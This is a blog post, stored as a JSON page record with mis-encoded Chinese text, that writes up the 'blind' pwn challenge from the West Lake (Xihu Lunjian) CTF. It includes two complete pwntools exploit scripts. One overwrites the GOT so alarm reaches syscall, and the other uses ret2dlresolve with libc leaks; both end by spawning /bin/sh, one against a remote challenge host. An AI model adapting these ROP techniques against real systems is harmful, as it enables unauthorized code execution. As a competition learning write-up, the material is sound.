{"title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/è¥¿æ¹–è®ºå‰‘pwnå¤ç°.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“</p></blockquote>\n<h1 id=\"blind\"><a href=\"#blind\" class=\"headerlink\" title=\"blind\"></a>blind</h1><p>å¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰</p>\n<p><img src=\"https://i.loli.net/2021/11/22/9DycriVvxKeOWbX.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellcodeï¼Œå¯¼è‡´ç™½æ‰“å‡ ä¸ªå°æ—¶ã€‚ï¼ˆä¹Ÿæ˜¯å¤ªèœäº†ï¼Œå•¥ä¹Ÿä¸æ‡‚ï¼‰èµ›åï¼Œçœ‹darryğŸ‘´EXPï¼Œå‘ç°alarmå‡½æ•°ä¸‹é¢æ˜¯syscallï¼Œåªéœ€è¦ä¿®æ”¹alarmçš„gotè¡¨ä¸ºsyscallï¼Œä¹‹åæ„é€ execve(â€˜/bin/shâ€™,0,0)å°±è¡Œã€‚</p>\n<p><img src=\"https://i.loli.net/2021/11/22/wtRsSfuZiV8BlXH.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹alarmå‡½æ•°æœ€åä¸€å­—èŠ‚ä¸ºsyscallçš„æœ€åä¸€å­—èŠ‚å°±è¡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„å»ºreadå‡½æ•°ä¿®æ”¹gotè¡¨</p>\n<p>åˆ©ç”¨initå‡½æ•°çš„ä¸¤ä¸ªgadgetæ„å»ºreadå‡½æ•°ä¿®æ”¹gotè¡¨</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gadget</span>(<span class=\"params\">addr,di,si,dx</span>):</span></span><br><span class=\"line\">\tpay=p64(<span class=\"number\">0x4007BA</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(addr)+p64(dx)+p64(si)+p64(di)+p64(<span class=\"number\">0x4007A0</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">7</span>*<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pay</span><br><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;read&quot;</span>],<span class=\"number\">0</span>,elf.got[<span class=\"string\">&quot;alarm&quot;</span>],<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p>ä¹‹åï¼Œåˆ©ç”¨readå‡½æ•°å°†/bin/sh/å­˜å…¥bssæ®µ</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;read&quot;</span>],<span class=\"number\">0</span>,<span class=\"number\">0x601088</span>,<span class=\"number\">0x3b</span>)</span><br></pre></td></tr></table></figure>\n\n<p>æœ€åæ„å»ºexecve(â€˜/bin/shâ€™,0,0)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;alarm&quot;</span>],<span class=\"number\">0x601088</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"EXP1\"><a href=\"#EXP1\" class=\"headerlink\" title=\"EXP1\"></a>EXP1</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> buf: io.send(buf)</span><br><span class=\"line\">shell = <span class=\"keyword\">lambda</span>: io.interactive()</span><br><span class=\"line\">io=process(<span class=\"string\">&quot;./blind&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./blind&quot;</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gadget</span>(<span class=\"params\">addr,di,si,dx</span>):</span></span><br><span class=\"line\">\tpay=p64(<span class=\"number\">0x4007BA</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(addr)+p64(dx)+p64(si)+p64(di)+p64(<span class=\"number\">0x4007A0</span>)+<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">7</span>*<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pay</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x58</span></span><br><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;read&quot;</span>],<span class=\"number\">0</span>,elf.got[<span class=\"string\">&quot;alarm&quot;</span>],<span class=\"number\">1</span>)</span><br><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;read&quot;</span>],<span class=\"number\">0</span>,<span class=\"number\">0x601088</span>,<span class=\"number\">0x3b</span>)</span><br><span class=\"line\">payload += gadget(elf.got[<span class=\"string\">&quot;alarm&quot;</span>],<span class=\"number\">0x601088</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">0x500</span> - <span class=\"built_in\">len</span>(payload)) * <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">s(<span class=\"string\">&quot;\\x19&quot;</span>)</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span> + <span class=\"string\">&quot;a&quot;</span> * (<span class=\"number\">0x3b</span>-<span class=\"number\">8</span>))</span><br><span class=\"line\">shell()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP2\"><a href=\"#EXP2\" class=\"headerlink\" title=\"EXP2\"></a>EXP2</h2><p>darryğŸ‘´åˆ©ç”¨ret2dlresloveçš„æ–¹æ³•ä¹Ÿæ‰“é€šäº†æœ¬åœ°ï¼Œä¸è¿‡å› ä¸ºè¿œç«¯çš„libcæ‰€ä»¥æ²¡æ‰“é€šï¼Œæˆ‘è¿˜æ²¡æ¶ˆåŒ–å®Œï¼Œç›´æ¥ä¸ŠEXPäº†</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">binary=<span class=\"string\">&#x27;./blind&#x27;</span></span><br><span class=\"line\">main_arena = <span class=\"number\">0x3ebc40</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> buf: io.send(buf)</span><br><span class=\"line\">sl = <span class=\"keyword\">lambda</span> buf: io.sendline(buf)</span><br><span class=\"line\">sa = <span class=\"keyword\">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class=\"line\">sal = <span class=\"keyword\">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class=\"line\">shell = <span class=\"keyword\">lambda</span>: io.interactive()</span><br><span class=\"line\">r = <span class=\"keyword\">lambda</span> n=<span class=\"literal\">None</span>: io.recv(n)</span><br><span class=\"line\">ra = <span class=\"keyword\">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class=\"line\">ru = <span class=\"keyword\">lambda</span> delim: io.recvuntil(delim)</span><br><span class=\"line\">rl = <span class=\"keyword\">lambda</span>: io.recvline()</span><br><span class=\"line\">rls = <span class=\"keyword\">lambda</span> n=<span class=\"number\">2</span>**<span class=\"number\">20</span>: io.recvlines(n)</span><br><span class=\"line\">su = <span class=\"keyword\">lambda</span> buf,addr:io.success(buf+<span class=\"string\">&quot;==&gt;&quot;</span>+<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\">local = <span class=\"number\">0</span>\t</span><br><span class=\"line\"><span class=\"keyword\">if</span> local == <span class=\"number\">1</span>:</span><br><span class=\"line\">    io=process(binary)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io=remote(<span class=\"string\">&#x27;82.157.6.165&#x27;</span>,<span class=\"number\">27200</span>)</span><br><span class=\"line\">elf=ELF(binary)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">one_gadget = [<span class=\"number\">0x4f3d5</span>,<span class=\"number\">0x4f432</span>,<span class=\"number\">0x10a41c</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">fun_addr = <span class=\"number\">0x4006B6</span>  <span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">Gadgets information</span></span><br><span class=\"line\"><span class=\"string\">============================================================</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007c0 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007c2 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000400620 : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007c3 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007c1 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000400549 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># bss</span></span><br><span class=\"line\">bss = elf.bss()</span><br><span class=\"line\"></span><br><span class=\"line\">l_addr = libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] - libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]<span class=\"comment\">#libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">r_offset = bss + l_addr * -<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> l_addr &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    l_addr = l_addr + <span class=\"number\">0x10000000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004007c3</span></span><br><span class=\"line\"><span class=\"comment\"># pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x00000000004007c1</span></span><br><span class=\"line\"></span><br><span class=\"line\">plt_load = <span class=\"number\">0x400556</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x58</span> + p64(pop_rsi) + p64(bss + <span class=\"number\">0x100</span>) + p64(<span class=\"number\">0</span>) + p64(pop_rdi) + p64(<span class=\"number\">0</span>) + p64(read_plt) + p64(fun_addr)</span><br><span class=\"line\">raw_input()</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">dynstr = <span class=\"number\">0x4003B8</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map_addr = bss + <span class=\"number\">0x100</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_dyn_strtab_addr = fake_link_map_addr + <span class=\"number\">0x8</span></span><br><span class=\"line\">fake_dyn_strtab = p64(<span class=\"number\">0</span>) + p64(dynstr)  <span class=\"comment\"># fake_link_map_addr + 0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_dyn_symtab_addr = fake_link_map_addr + <span class=\"number\">0x18</span></span><br><span class=\"line\">fake_dyn_symtab = p64(<span class=\"number\">0</span>) + p64(read_got - <span class=\"number\">0x8</span>)  <span class=\"comment\"># fake_link_map_addr + 0x18</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_dyn_rel_addr = fake_link_map_addr + <span class=\"number\">0x28</span></span><br><span class=\"line\">fake_dyn_rel = p64(<span class=\"number\">0</span>) + p64(fake_link_map_addr + <span class=\"number\">0x38</span>)  <span class=\"comment\"># fake_link_map_addr + 0x28</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_rel = p64(r_offset) + p64(<span class=\"number\">0x7</span>) + p64(<span class=\"number\">0</span>)  <span class=\"comment\"># fake_link_map_addr + 0x38</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map = p64(l_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map += fake_dyn_strtab</span><br><span class=\"line\">fake_link_map += fake_dyn_symtab</span><br><span class=\"line\">fake_link_map += fake_dyn_rel</span><br><span class=\"line\">fake_link_map += fake_rel</span><br><span class=\"line\">fake_link_map = fake_link_map.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map += p64(fake_dyn_strtab_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map += p64(fake_dyn_symtab_addr)  <span class=\"comment\"># fake_link_map_addr + 0x70</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map += <span class=\"string\">b&#x27;/bin/sh&#x27;</span>.ljust(<span class=\"number\">0x80</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map += p64(fake_dyn_rel_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(fake_link_map)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\">#raw_input()</span></span><br><span class=\"line\">sleep(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">rop = <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x58</span> + p64(pop_rdi) +p64(<span class=\"number\">1</span>)+p64(pop_rsi)+ p64(<span class=\"number\">0x601018</span>) + p64(<span class=\"number\">0</span>) +p64(plt_load) + p64(fake_link_map_addr) + p64(<span class=\"number\">0</span>)+p64(fun_addr)</span><br><span class=\"line\">io.sendline(rop)</span><br><span class=\"line\">leak = u64(ru(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">su(<span class=\"string\">&#x27;alarm&#x27;</span>,leak)</span><br><span class=\"line\">leak = u64(ru(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">su(<span class=\"string\">&#x27;read&#x27;</span>,leak)</span><br><span class=\"line\">leak = u64(ru(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">su(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>,leak)</span><br><span class=\"line\">leak = u64(ru(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">su(<span class=\"string\">&#x27;setvbuf&#x27;</span>,leak)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;setvbuf&#x27;</span>, leak)</span><br><span class=\"line\">libc_base = leak - libc.dump(<span class=\"string\">&#x27;setvbuf&#x27;</span>)</span><br><span class=\"line\">leak = u64(ru(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">su(<span class=\"string\">&#x27;sleep&#x27;</span>,leak)</span><br><span class=\"line\"></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x58</span> + p64(pop_rdi) + p64(fake_link_map_addr + <span class=\"number\">0x78</span>) + p64(libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>))</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"æœ€å\"><a href=\"#æœ€å\" class=\"headerlink\" title=\"æœ€å\"></a>æœ€å</h2><p>è®²ä¸€ä¸‹å¦‚ä½•æ‰“è¿œç«¯</p>\n<p>å…ˆåˆ©ç”¨EXP2æ³„éœ²è¿œç«¯çš„alarmå‡½æ•°åœ°å€ï¼Œå†å°†EXP1é‡Œé¢è¦ä¿®æ”¹çš„åœ°å€æ”¹æˆè¿œç«¯çš„å°±è¡Œï¼Œä¾‹å¦‚ä¸‹å›¾å°±æ˜¯å°†\\x19æ”¹æˆ\\xd5</p>\n<p><img src=\"https://i.loli.net/2021/11/22/CgjeaFqhZ4vlLSE.png\" alt=\"1637416467725-484e249c-609f-45ed-be96-e348444c4161.png\"></p>\n<p><img src=\"https://i.loli.net/2021/11/22/sXSwUZHb2cf3tIp.png\" alt=\"image.png\"></p>\n","feature":true,"text":" ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“ blindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰ æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#blind\"><span class=\"toc-text\">blind</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP1\"><span class=\"toc-text\">EXP1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP2\"><span class=\"toc-text\">EXP2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%80%E5%90%8E\"><span class=\"toc-text\">æœ€å</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"å †","uid":"c4bf9a47934395d80559cc60b6290065","slug":"å †","date":"2021-11-23T14:10:20.000Z","updated":"2021-12-02T12:19:33.706Z","comments":true,"path":"api/articles/å †.json","keywords":null,"cover":"https://i.loli.net/2021/11/25/Z485hvdikxGYrAS.jpg","text":" åœ¨æ ˆä¸Šæ‹–äº†å¥½ä¹…æ‰è¿›å…¥å †ï¼Œè¿™é‡Œå°±ä»‹ç»ä¸€ä¸‹è¿™å‡ å¤©æ‰€å­¦çš„å†…å®¹ ä»€ä¹ˆæ˜¯å † å †ä¸åŒäºæ ˆï¼Œæ ˆæ˜¯é™æ€åˆ†å¸ƒï¼Œä¹Ÿå°±æ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜å°±ä¼šåˆ†é…ï¼Œè€Œå 